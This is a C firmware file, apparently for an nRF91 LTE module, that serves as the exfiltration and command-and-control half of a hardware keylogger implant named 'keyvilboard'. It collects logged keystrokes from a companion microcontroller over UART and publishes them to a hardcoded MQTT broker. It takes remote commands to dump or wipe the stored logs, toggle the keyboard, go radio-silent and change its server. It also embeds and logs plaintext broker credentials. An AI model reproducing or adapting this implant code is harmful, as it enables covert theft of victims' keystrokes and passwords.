/*
 * Copyright (c) 2018 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: LicenseRef-Nordic-5-Clause
 */

#include <power/reboot.h>
#include <zephyr.h>
#include <stdio.h>
#include <drivers/uart.h>
#include <string.h>
#include <stdlib.h>
#include <fs/nvs.h>
#include <device.h>
#include <drivers/flash.h>
#include <storage/flash_map.h>
#include <stats/stats.h>
#include <net/mqtt.h>
#include <net/socket.h>
#include <modem/lte_lc.h>
#include <random/rand32.h>
#include <logging/log.h>

#if defined(CONFIG_MODEM_KEY_MGMT)
#include <modem/modem_key_mgmt.h>
#endif
#if defined(CONFIG_LWM2M_CARRIER)
#include <lwm2m_carrier.h>
#endif
#include <dk_buttons_and_leds.h>

#include "certificates.h"

LOG_MODULE_REGISTER(mqtt_simple, CONFIG_MQTT_SIMPLE_LOG_LEVEL);

/*MQTT Variabels,  These ID's are reference to the blocks they are stored in once in Non Volitaile Storage*/
char ImplantProject[100] = "projectx"; // ID2 is shared 
char mqtt_dns[100] = "mqtt.keyvilboard.com"; //ID2
char ImplantID[100] = "keyvilboard"; //ID3
char password1[100] = "helemooie"; //ID4
char username[100] = "luc"; //ID5
char topicsub[100]; //ID6 This Variable is populated by Implant Project or By the NVS once pushed
char topicpub[100]; //ID7 This Variable is populated by Implant Project or By the NVS once pushed
int filesend = 1;

/* Sleep time */
unsigned long sleeptime;

/* NVS-related defines */
#define DT_FLASH_AREA_STORAGE_OFFSET FLASH_AREA_OFFSET(storage)
#define SECTOR_COUNT 5U
char nvs_rx_buff[90];
static struct nvs_fs fs;

// Buffer UART
static char keyvmessage_array[2048];
static char uart_buf[2048];
static int uart_counter = 0;
static K_FIFO_DEFINE(fifo_uart_tx_data);

struct uart_data_t {
	void *fifo_reserved;
	uint8_t data[2048];
	uint16_t len;
};

/* Timer, These variables are used to timeout communication between Baseboard and NRF once sending files, This should not happen! */
int64_t time_stamp;
int64_t milliseconds_spent;
int64_t TXtimeout = 10000;

int dumpdone = 0;

/* Buffers for MQTT client. */
static uint8_t rx_buffer[CONFIG_MQTT_MESSAGE_BUFFER_SIZE];
static uint8_t tx_buffer[CONFIG_MQTT_MESSAGE_BUFFER_SIZE];
static uint8_t payload_buf[CONFIG_MQTT_PAYLOAD_BUFFER_SIZE];

/* The mqtt client struct */
static struct mqtt_client client;

/* MQTT Broker details. */
static struct sockaddr_storage broker;

/* File descriptor */
static struct pollfd fds;

/*Block Below will provision certificates to the modem to setup MQTT connection
These same certificates will later be used when connecting*/
#if defined(CONFIG_MQTT_LIB_TLS)
static int certificates_provision(void)
{
	int err = 0;

	LOG_INF("Provisioning certificates");

#if defined(CONFIG_NRF_MODEM_LIB) && defined(CONFIG_MODEM_KEY_MGMT)

	err = modem_key_mgmt_write(CONFIG_MQTT_TLS_SEC_TAG,
				   MODEM_KEY_MGMT_CRED_TYPE_CA_CHAIN,
				   CA_CERTIFICATE, strlen(CA_CERTIFICATE));
	if (err) {
		LOG_ERR("Failed to provision CA certificate: %d", err);
		return err;
	}

	err = modem_key_mgmt_write(CONFIG_MQTT_TLS_SEC_TAG,
				   MODEM_KEY_MGMT_CRED_TYPE_PRIVATE_CERT,
				   CLIENT_PRIVATE_KEY,
				   strlen(CLIENT_PRIVATE_KEY));
	if (err) {
		LOG_ERR("Failed to register private key: %d", err);
		return err;
	}

	err = modem_key_mgmt_write(CONFIG_MQTT_TLS_SEC_TAG,
				   MODEM_KEY_MGMT_CRED_TYPE_PUBLIC_CERT,
				   CLIENT_PUBLIC_CERTIFICATE,
				   strlen(CLIENT_PUBLIC_CERTIFICATE));
	if (err) {
		LOG_ERR("Failed to register public certificate: %d", err);
		return err;
	}

#elif defined(CONFIG_BOARD_QEMU_X86) && defined(CONFIG_NET_SOCKETS_SOCKOPT_TLS)

	err = tls_credential_add(CONFIG_MQTT_TLS_SEC_TAG,
				 TLS_CREDENTIAL_CA_CERTIFICATE, CA_CERTIFICATE,
				 sizeof(CA_CERTIFICATE));
	if (err) {
		LOG_ERR("Failed to register CA certificate: %d", err);
		return err;
	}

#endif

	return err;
}
#endif /* defined(CONFIG_MQTT_LIB_TLS) */

#if defined(CONFIG_NRF_MODEM_LIB)

/**@brief Recoverable modem library error. */
void nrf_modem_recoverable_error_handler(uint32_t err)
{
	LOG_ERR("Modem library recoverable error: %u", (unsigned int)err);
}

#endif /* defined(CONFIG_NRF_MODEM_LIB) */

#if defined(CONFIG_LWM2M_CARRIER)
K_SEM_DEFINE(carrier_registered, 0, 1);
int lwm2m_carrier_event_handler(const lwm2m_carrier_event_t *event)
{
	switch (event->type) {
	case LWM2M_CARRIER_EVENT_BSDLIB_INIT:
		LOG_INF("LWM2M_CARRIER_EVENT_BSDLIB_INIT");
		break;
	case LWM2M_CARRIER_EVENT_CONNECTING:
		LOG_INF("LWM2M_CARRIER_EVENT_CONNECTING");
		break;
	case LWM2M_CARRIER_EVENT_CONNECTED:
		LOG_INF("LWM2M_CARRIER_EVENT_CONNECTED");
		break;
	case LWM2M_CARRIER_EVENT_DISCONNECTING:
		LOG_INF("LWM2M_CARRIER_EVENT_DISCONNECTING");
		break;
	case LWM2M_CARRIER_EVENT_DISCONNECTED:
		LOG_INF("LWM2M_CARRIER_EVENT_DISCONNECTED");
		break;
	case LWM2M_CARRIER_EVENT_BOOTSTRAPPED:
		LOG_INF("LWM2M_CARRIER_EVENT_BOOTSTRAPPED");
		break;
	case LWM2M_CARRIER_EVENT_REGISTERED:
		LOG_INF("LWM2M_CARRIER_EVENT_REGISTERED");
		k_sem_give(&carrier_registered);
		break;
	case LWM2M_CARRIER_EVENT_DEFERRED:
		LOG_INF("LWM2M_CARRIER_EVENT_DEFERRED");
		break;
	case LWM2M_CARRIER_EVENT_FOTA_START:
		LOG_INF("LWM2M_CARRIER_EVENT_FOTA_START");
		break;
	case LWM2M_CARRIER_EVENT_REBOOT:
		LOG_INF("LWM2M_CARRIER_EVENT_REBOOT");
		break;
	case LWM2M_CARRIER_EVENT_LTE_READY:
		LOG_INF("LWM2M_CARRIER_EVENT_LTE_READY");
		break;
	case LWM2M_CARRIER_EVENT_ERROR:
		LOG_ERR("LWM2M_CARRIER_EVENT_ERROR: code %d, value %d",
			((lwm2m_carrier_event_error_t *)event->data)->code,
			((lwm2m_carrier_event_error_t *)event->data)->value);
		break;
	default:
		LOG_WRN("Unhandled LWM2M_CARRIER_EVENT: %d", event->type);
		break;
	}

	return 0;
}
#endif /* defined(CONFIG_LWM2M_CARRIER) */

/**@brief Function to print strings without null-termination
 */

/*The below function empties uart buffers and mqtt buffers*/
void cleanme()
{
	uart_counter = 0;
	memset(uart_buf, 0, sizeof(uart_buf));
	memset(keyvmessage_array, 0, sizeof(keyvmessage_array));
	memset(rx_buffer, 0, sizeof(rx_buffer));
	memset(tx_buffer, 0, sizeof(tx_buffer));
	memset(payload_buf, 0, sizeof(payload_buf));
}

/*Debugging VOID*/
static void data_print(uint8_t *prefix, uint8_t *data, size_t len)
{
	char buf[len + 1];

	memcpy(buf, data, len);
	buf[len] = 0;
	LOG_INF("%s%s", log_strdup(prefix), log_strdup(buf));
}

/**@brief Function to publish data on the configured topic
 */
static int data_publish(struct mqtt_client *c, enum mqtt_qos qos, uint8_t *data,
			size_t len)
{
	struct mqtt_publish_param param;

	param.message.topic.qos = qos;
	param.message.topic.topic.utf8 = topicpub;
	param.message.topic.topic.size = strlen(topicpub);
	param.message.payload.data = data;
	param.message.payload.len = len;
	param.message_id = sys_rand32_get();
	param.dup_flag = 0;
	param.retain_flag = 0;

	data_print("Publishing: ", data, len);
	LOG_INF("to topic: %s len: %u", CONFIG_MQTT_PUB_TOPIC,
		(unsigned int)strlen(CONFIG_MQTT_PUB_TOPIC));

	return mqtt_publish(c, &param);
}

/*Simple Function To Publish the populated array to the server*/
void mqtt_keypub()
{
	data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE, keyvmessage_array,
		     sizeof(keyvmessage_array));
	cleanme();
}

/*Function that will run multithreaded listelign to possible incomming data on the uartbus specified in .overlay
It's important that this function is not used as a trigger to start a function since it will loop per byte recieved
and this will cause lagg and issues, currently it's setup to recieve and send data, those functions will be called later on*/
void uart_cb(const struct device *x, void *context)
{
	uart_irq_update(x);
	int data_length = 0;

	if (uart_irq_rx_ready(x)) {
		data_length = uart_fifo_read(x, uart_buf, sizeof(uart_buf));
		uart_buf[data_length] = 0;
		memcpy(&keyvmessage_array[uart_counter], uart_buf, 1);
		uart_counter++;
	}

	if (uart_irq_tx_ready(x)) {
		struct uart_data_t *buf =
			k_fifo_get(&fifo_uart_tx_data, K_NO_WAIT);
		uint16_t written = 0;

		/* Nothing in the FIFO, nothing to send */
		if (!buf) {
			uart_irq_tx_disable(x);
			return;
		}

		while (buf->len > written) {
			written += uart_fifo_fill(x, &buf->data[written],
						  buf->len - written);
		}

		while (!uart_irq_tx_complete(x)) {
			/* Wait for the last byte to get
			 * shifted out of the module
			 */
		}

		if (k_fifo_is_empty(&fifo_uart_tx_data)) {
			uart_irq_tx_disable(x);
		}

		k_free(buf);
	}
}

/*This function is used to recieve data from atmega which is stored on SDcard*/
void SDDUMP()
{
	dumpdone = 0;
	const struct device *uart2 = device_get_binding("UART_2");
	uart_irq_callback_set(uart2, uart_cb);
	uart_fifo_fill(
		uart2, "PUBSUC6",
		sizeof("PUBSUC6")); // send to atmega to confirm next 2048 bytes to be send
	uart_irq_tx_enable(uart2);
	time_stamp = k_uptime_get();
	while (dumpdone == 0) {
		milliseconds_spent = k_uptime_get();
		if (strstr(keyvmessage_array,
			   "DONE\r\n")) { //check if file is done this will be send by atmega if it send all data on atmega.
			data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE,
				     keyvmessage_array,
				     sizeof(keyvmessage_array));
			cleanme();
			dumpdone = 1;
			filesend = 1;
		}

		else if (strstr(keyvmessage_array, "\r\r\n") !=
			 NULL) { //end of 2048 bytes but there is more
			printk("%s", keyvmessage_array);
			mqtt_keypub();
			dumpdone = 1;
		}

		else if (milliseconds_spent - time_stamp >
			 TXtimeout) { //no data recieved for 10 seconds
			printk("PUBLISH TIMEOUT");
			data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE,
				     "TIMEOUT", sizeof("TIMEOUT"));
			printk("%s", keyvmessage_array);
			cleanme();
			dumpdone = 1;
			filesend = 1;
		}
	}
}

/*Function to load config that might have been put*/
void CONFIGPARSE()
{
	int configpart = 0;
	char *token = strtok(payload_buf, ";");
	// loop through the string to extract all other tokens
	while (token != NULL) {
		configpart++;
		//printk("%s\n", token); //printing each token
		token = strtok(NULL, ";");
		if (configpart == 1) {
			printk("Setting Config Recieved Since");
			nvs_write(&fs, configpart, "ConfigRecievedSince=True",
				  strlen("ConfigRecievedSince=True") + 1);
		} else if (configpart == 2) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("DNS:%s\n", token);
		} else if (configpart == 3) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("ImplantID:%s\n", token);
		} else if (configpart == 4) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("password:%s\n", token);
		} else if (configpart == 5) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("username:%s\n", token);
		} else if (configpart == 6) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("topicsub:%s\n", token);
		} else if (configpart == 7) {
			nvs_write(&fs, configpart, token, strlen(token) + 1);
			printk("topicpub:%s\n", token);
		} else {
		}
	}
	sys_reboot(SYS_REBOOT_COLD);
}

/*Function that makes No RF noise possible on physical repower it will always connect to server. Could be made non volitile but isnt at this moment and time*/
void SLEEPACTIVATE()
{
	lte_lc_offline(); //turn off modem other states could be called but this is most hefty one technically you could fully turn off the NRF91 since its just used for radio.
	int timepart = 0;
	char *token = strtok(payload_buf, ";");
	// loop through the string to extract all other tokens
	while (token != NULL) {
		timepart++;
		token = strtok(NULL, ";");
		if (timepart == 1) {
			sleeptime = atoi(
				token); //parse sleep time that has been recieved over mqtt
		}
	}
	k_msleep(
		sleeptime); //wait till sleep time in ms has been passed than restart to enable modem again
	sys_reboot(SYS_REBOOT_COLD);
}

/*Function to enable NVS*/
void setupnvs()
{
	int err;
	struct flash_pages_info info;
	fs.offset = DT_FLASH_AREA_STORAGE_OFFSET;
	err = flash_get_page_info_by_offs(
		device_get_binding(DT_CHOSEN_ZEPHYR_FLASH_CONTROLLER_LABEL),
		fs.offset, &info);
	if (err) {
		printk("Unable to get page info");
	}
	fs.sector_size = info.size;
	fs.sector_count = SECTOR_COUNT;

	err = nvs_init(&fs, DT_CHOSEN_ZEPHYR_FLASH_CONTROLLER_LABEL);
	if (err) {
		printk("Flash Init failed\n");
	}
}

/*Pull config from NVS if it has been PUT*/
void PULLCONFIG()
{
	/*Setup sub and pub topic*/
	strcat(ImplantProject, "/"); 
	strcat(ImplantID, "/send");
	strcat(ImplantProject, ImplantID);
	strcat(topicsub, ImplantProject);
	strcat(ImplantProject, "/");
	strcat(ImplantID, "/recieve");
	strcat(ImplantProject, ImplantID);
	strcat(topicpub, ImplantProject);
	int datablok = 1;
	nvs_read(&fs, datablok, nvs_rx_buff, sizeof(nvs_rx_buff));
	if (strstr(nvs_rx_buff, "ConfigRecievedSince=True") != NULL) {
		printk("Config has been put");
		while (datablok < 8) {
			nvs_read(&fs, datablok, nvs_rx_buff,
				 sizeof(nvs_rx_buff));
			if (datablok == 1) {
			} else if (datablok == 2) {
				strcpy(mqtt_dns, nvs_rx_buff);
				printk("DNS:%s\n", mqtt_dns);
			} else if (datablok == 3) {
				strcpy(ImplantID, nvs_rx_buff);
				printk("ImplantID:%s\n", ImplantID);
			} else if (datablok == 4) {
				strcpy(password1, nvs_rx_buff);
				printk("password:%s\n", password1);
			} else if (datablok == 5) {
				strcpy(username, nvs_rx_buff);
				printk("username:%s\n", username);
			} else if (datablok == 6) {
				strcpy(topicsub, nvs_rx_buff);
				printk("topicsub:%s\n", topicsub);
			} else if (datablok == 7) {
				strcpy(topicpub, nvs_rx_buff);
				printk("topicpub:%s\n", topicpub);
			}
			datablok++;
			memset(nvs_rx_buff, 0, sizeof(nvs_rx_buff));
		}
	} else {
		printk("Data read from nvs: %s at ID %d\n", nvs_rx_buff,
		       datablok);
		printk("Config not put");
	}
}

/*Function to send trigger to empty file on atmega*/
void CLEARSD()
{
	const struct device *uart2 = device_get_binding("UART_2");
	uart_irq_callback_set(uart2, uart_cb);
	uart_fifo_fill(uart2, "CLEARSD", sizeof("CLEARSD")); // fill buffer to send empty command
	data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE, "SD Cleared",
		     sizeof("SD Cleared"));
}

/*Function to turn off or on the keyboard */
void TOGGLEKEY()
{
	const struct device *uart2 = device_get_binding("UART_2");
	uart_irq_callback_set(uart2, uart_cb);
	int i = 0;
	uart_fifo_fill(uart2, "TOGGLEKEYBOARD", sizeof("TOGGLEKEYBOARD"));
	while (i == 0) {//CHECK WHAT STATUS IS OF keyboard on atmega and send it back
		if (strstr(keyvmessage_array, "KEYOFF") != NULL) {
			data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE,
				     "KEYBOARD TURNED OFF",
				     sizeof("KEYBOARD TURNED OFF"));
			i = 1;
			cleanme();
		}

		if (strstr(keyvmessage_array, "KEYONN") != NULL) {
			data_publish(&client, MQTT_QOS_1_AT_LEAST_ONCE,
				     "KEYBOARD TURNED ON",
				     sizeof("KEYBOARD TURNED ON"));
			i = 1;
			cleanme();
		}
	}
}

/**@brief Function to subscribe to the configured topic
 */
static int subscribe(void)
{
	struct mqtt_topic subscribe_topic = {
		.topic = { .utf8 = topicsub, .size = strlen(topicsub) },
		.qos = MQTT_QOS_1_AT_LEAST_ONCE
	};

	const struct mqtt_subscription_list subscription_list = {
		.list = &subscribe_topic, .list_count = 1, .message_id = 1234
	};

	LOG_INF("Subscribing to: %s len %u", topicsub,
		(unsigned int)strlen(topicsub));

	return mqtt_subscribe(&client, &subscription_list);
}

/**@brief Function to read the published payload.
 */
static int publish_get_payload(struct mqtt_client *c, size_t length)
{
	if (length > sizeof(payload_buf)) {
		return -EMSGSIZE;
	}

	return mqtt_readall_publish_payload(c, payload_buf, length);
}

/**@brief MQTT client event handler

This function is also used to keep looping for publishes, furthermore it does the command processing of the thing 
that are asked for by the C2.
 */
void mqtt_evt_handler(struct mqtt_client *const c, const struct mqtt_evt *evt)
{
	int err;
	switch (evt->type) {
	case MQTT_EVT_CONNACK:
		if (evt->result != 0) {
			LOG_ERR("MQTT connect failed: %d", evt->result);
			sys_reboot(SYS_REBOOT_COLD);
			break;
		}

		LOG_INF("MQTT client connected");
		subscribe();
		break;

	case MQTT_EVT_DISCONNECT:
		LOG_INF("MQTT client disconnected: %d", evt->result);
		sys_reboot(SYS_REBOOT_COLD);
		break;

	case MQTT_EVT_PUBLISH: {
		const struct mqtt_publish_param *p = &evt->param.publish;

		LOG_INF("MQTT PUBLISH result=%d len=%d", evt->result,
			p->message.payload.len);
		err = publish_get_payload(c, p->message.payload.len);

		if (p->message.topic.qos == MQTT_QOS_1_AT_LEAST_ONCE) {
			const struct mqtt_puback_param ack = {
				.message_id = p->message_id
			};

			/* Send acknowledgment. */
			mqtt_publish_qos1_ack(&client, &ack);
		}

		if (err >= 0) {
			data_print("Received: ", payload_buf,
				   p->message.payload.len);
			/* Parsing of recieved commando's*/
			if (strstr(payload_buf, "sleep_for") != NULL) {
				printk("sleep_for Triggerd");
				SLEEPACTIVATE();
			} else if (strstr(payload_buf, "send_config") != NULL) {
				printk("send_config Triggerd");
				CONFIGPARSE();
			} else if (strstr(payload_buf, "DUMPFULLSD") != NULL) {
				printk("DUMPFULLSD Triggerd");
				time_stamp = k_uptime_get();
				const struct device *uart2 =
					device_get_binding("UART_2");
				uart_irq_callback_set(uart2, uart_cb);
				uart_fifo_fill(uart2, "DUMPFULLSD",
					       sizeof("DUMPFULLSD"));
				uart_irq_tx_enable(uart2);
				filesend = 0;
			} else if (strstr(payload_buf, "CLEARSD") != NULL) {
				printk("CLEARSD Triggerd");
				CLEARSD();
			} else if (strstr(payload_buf, "TOGGLEKEYBOARD") != NULL) {
				printk("KEYBOARD ON/OFF TOGGLED");
				TOGGLEKEY();
			} else {
				printk("Fout of Geen Command");
			}
		} else {
			LOG_ERR("publish_get_payload failed: %d", err);
			LOG_INF("Disconnecting MQTT client...");

			err = mqtt_disconnect(c);
			if (err) {
				LOG_ERR("Could not disconnect: %d", err);
			}
		}
	} break;

	case MQTT_EVT_PUBACK:
		if (evt->result != 0) {
			LOG_ERR("MQTT PUBACK error: %d", evt->result);
			break;
		}

		LOG_INF("PUBACK packet id: %u", evt->param.puback.message_id);
		break;

	case MQTT_EVT_SUBACK:
		if (evt->result != 0) {
			LOG_ERR("MQTT SUBACK error: %d", evt->result);
			break;
		}

		LOG_INF("SUBACK packet id: %u", evt->param.suback.message_id);
		break;

	case MQTT_EVT_PINGRESP:
		if (evt->result != 0) {
			LOG_ERR("MQTT PINGRESP error: %d", evt->result);
		}
		break;

	default:
		LOG_INF("Unhandled MQTT event type: %d", evt->type);
		break;
	}
	if (filesend == 0) {
		SDDUMP(); // loop function call for publishing sdcard data
	}
	//use this for looping statements per update from the server
}

/**@brief Resolves the configured hostname and
 * initializes the MQTT broker structure
 */
static int broker_init(void)
{
	int err;
	struct addrinfo *result;
	struct addrinfo *addr;
	struct addrinfo hints = { .ai_family = AF_INET,
				  .ai_socktype = SOCK_STREAM };

	err = getaddrinfo(mqtt_dns, NULL, &hints, &result);
	if (err) {
		LOG_ERR("getaddrinfo failed: %d", err);
		return -ECHILD;
	}

	addr = result;

	/* Look for address of the broker. */
	while (addr != NULL) {
		/* IPv4 Address. */
		if (addr->ai_addrlen == sizeof(struct sockaddr_in)) {
			struct sockaddr_in *broker4 =
				((struct sockaddr_in *)&broker);
			char ipv4_addr[NET_IPV4_ADDR_LEN];

			broker4->sin_addr.s_addr =
				((struct sockaddr_in *)addr->ai_addr)
					->sin_addr.s_addr;
			broker4->sin_family = AF_INET;
			broker4->sin_port = htons(CONFIG_MQTT_BROKER_PORT);

			inet_ntop(AF_INET, &broker4->sin_addr.s_addr, ipv4_addr,
				  sizeof(ipv4_addr));
			LOG_INF("IPv4 Address found %s", log_strdup(ipv4_addr));

			break;
		} else {
			LOG_ERR("ai_addrlen = %u should be %u or %u",
				(unsigned int)addr->ai_addrlen,
				(unsigned int)sizeof(struct sockaddr_in),
				(unsigned int)sizeof(struct sockaddr_in6));
		}

		addr = addr->ai_next;
	}

	/* Free the address. */
	freeaddrinfo(result);

	return err;
}

/**@brief Initialize the MQTT client structure
 */
static int client_init(struct mqtt_client *client)
{
	int err;

	mqtt_client_init(client);

	err = broker_init();
	if (err) {
		LOG_ERR("Failed to initialize broker connection");
		return err;
	}

	/* MQTT client configuration */
	client->broker = &broker;
	client->evt_cb = mqtt_evt_handler;
	client->client_id.utf8 = (uint8_t *)ImplantID;
	client->client_id.size = strlen(client->client_id.utf8);
	struct mqtt_utf8 pass, name;
	pass.size = strlen(password1);
	pass.utf8 = password1;
	printk("pass: %d,%s\n", pass.size, pass.utf8);
	name.size = strlen(username);
	name.utf8 = username;
	printk("name: %d,%s\n", name.size, name.utf8);
	client->password = &pass;
	client->user_name = &name;
	client->protocol_version = MQTT_VERSION_3_1_1;

	/* MQTT buffers configuration */
	client->rx_buf = rx_buffer;
	client->rx_buf_size = sizeof(rx_buffer);
	client->tx_buf = tx_buffer;
	client->tx_buf_size = sizeof(tx_buffer);

	/* MQTT transport configuration */
#if defined(CONFIG_MQTT_LIB_TLS)
	struct mqtt_sec_config *tls_cfg = &(client->transport).tls.config;
	static sec_tag_t sec_tag_list[] = { CONFIG_MQTT_TLS_SEC_TAG };

	LOG_INF("TLS enabled");
	client->transport.type = MQTT_TRANSPORT_SECURE;

	tls_cfg->peer_verify = CONFIG_MQTT_TLS_PEER_VERIFY;
	tls_cfg->cipher_count = 0;
	tls_cfg->cipher_list = NULL;
	tls_cfg->sec_tag_count = ARRAY_SIZE(sec_tag_list);
	tls_cfg->sec_tag_list = sec_tag_list;
	tls_cfg->hostname = mqtt_dns;

#if defined(CONFIG_NRF_MODEM_LIB)
	tls_cfg->session_cache = IS_ENABLED(CONFIG_MQTT_TLS_SESSION_CACHING) ?
					 TLS_SESSION_CACHE_ENABLED :
					 TLS_SESSION_CACHE_DISABLED;
#else
	/* TLS session caching is not supported by the Zephyr network stack */
	tls_cfg->session_cache = TLS_SESSION_CACHE_DISABLED;

#endif

#else
	client->transport.type = MQTT_TRANSPORT_NON_SECURE;
#endif

	return err;
}

/**@brief Initialize the file descriptor structure used by poll.
 */
static int fds_init(struct mqtt_client *c)
{
	if (c->transport.type == MQTT_TRANSPORT_NON_SECURE) {
		fds.fd = c->transport.tcp.sock;
	} else {
#if defined(CONFIG_MQTT_LIB_TLS)
		fds.fd = c->transport.tls.sock;
#else
		return -ENOTSUP;
#endif
	}

	fds.events = POLLIN;

	return 0;
}

/**@brief Configures modem to provide LTE link. Blocks until link is
 * successfully established.
 */
static int modem_configure(void)
{
	/* Turn off LTE power saving features for a more responsive demo. Also,
	 * request power saving features before network registration. Some
	 * networks rejects timer updates after the device has registered to the
	 * LTE network.
	 */
	LOG_INF("Disabling PSM and eDRX");
	lte_lc_psm_req(false);
	lte_lc_edrx_req(false);

#if defined(CONFIG_LTE_LINK_CONTROL)
	if (IS_ENABLED(CONFIG_LTE_AUTO_INIT_AND_CONNECT)) {
		/* Do nothing, modem is already turned on
		 * and connected.
		 */
	} else {
#if defined(CONFIG_LWM2M_CARRIER)
		/* Wait for the LWM2M_CARRIER to configure the modem and
		 * start the connection.
		 */
		LOG_INF("Waitng for carrier registration...");
		k_sem_take(&carrier_registered, K_FOREVER);
		LOG_INF("Registered!");
#else /* defined(CONFIG_LWM2M_CARRIER) */
		int err;

		LOG_INF("LTE Link Connecting...");
		err = lte_lc_init_and_connect();
		if (err) {
			LOG_INF("Failed to establish LTE connection: %d", err);
			return err;
		}
		LOG_INF("LTE Link Connected!");
#endif /* defined(CONFIG_LWM2M_CARRIER) */
	}
#endif /* defined(CONFIG_LTE_LINK_CONTROL) */

	return 0;
}

/*This is ofcourse the main loop containing all functions, Keep in mind if you add function this loop doesnt 
get triggerd that often since it hovers in the MQTT event handler most of the time so its best to put a function there.
It also contains most error catching if errors arrise most functions should be setup that the nrf91 reboots. Normaly it should get errors but somethings
may be triggerd by the server and can be very simple issues. Thats why reboot is the safest option all this will never effect the working of the keyboard and the logging
Locally. The nrf91 can blow up and the keyboard/logging will still work.*/
void main(void)
{
	
	const struct device *uart2 = device_get_binding("UART_2");//enable uart
	uart_irq_callback_set(uart2, uart_cb);
	uart_irq_rx_enable(uart2);
	printk("UART loopback start!\n");
	int err;
	uint32_t connect_attempt = 0;
	LOG_INF("The MQTT simple sample started");
	setupnvs(); // enable NVS
	PULLCONFIG(); // CHECK if config has been put and put the sub and pub topic

#if defined(CONFIG_MQTT_LIB_TLS)
	err = certificates_provision();
	if (err != 0) {
		LOG_ERR("Failed to provision certificates");
		return;
	}
#endif /* defined(CONFIG_MQTT_LIB_TLS) */

	do {
		err = modem_configure();
		if (err) {
			LOG_INF("Retrying in %d seconds",
				CONFIG_LTE_CONNECT_RETRY_DELAY_S);
			k_sleep(K_SECONDS(CONFIG_LTE_CONNECT_RETRY_DELAY_S));
		}
	} while (err);

	err = client_init(&client);
	if (err != 0) {
		LOG_ERR("client_init: %d", err);
		return;
	}

do_connect:
	if (connect_attempt++ > 0) {
		LOG_INF("Reconnecting in %d seconds...",
			CONFIG_MQTT_RECONNECT_DELAY_S);
		k_sleep(K_SECONDS(CONFIG_MQTT_RECONNECT_DELAY_S));
	}
	err = mqtt_connect(&client);
	if (err != 0) {
		LOG_ERR("mqtt_connect %d", err);
		goto do_connect;
	}

	err = fds_init(&client);
	if (err != 0) {
		LOG_ERR("fds_init: %d", err);
		return;
	}

	while (1) {
		err = poll(&fds, 1, mqtt_keepalive_time_left(&client));
		if (err < 0) {
			LOG_ERR("poll: %d", errno);
			break;
		}

		err = mqtt_live(&client);
		if ((err != 0) && (err != -EAGAIN)) {
			LOG_ERR("ERROR: mqtt_live: %d", err);
			break;
		}

		if ((fds.revents & POLLIN) == POLLIN) {
			err = mqtt_input(&client);
			if (err != 0) {
				LOG_ERR("mqtt_input: %d", err);
				break;
			}
		}

		if ((fds.revents & POLLERR) == POLLERR) {
			LOG_ERR("POLLERR");
			break;
		}

		if ((fds.revents & POLLNVAL) == POLLNVAL) {
			LOG_ERR("POLLNVAL");
			break;
		}
	}

	LOG_INF("Disconnecting MQTT client...");

	err = mqtt_disconnect(&client);
	if (err) {
		LOG_ERR("Could not disconnect MQTT client: %d", err);
	}
	goto do_connect;
}
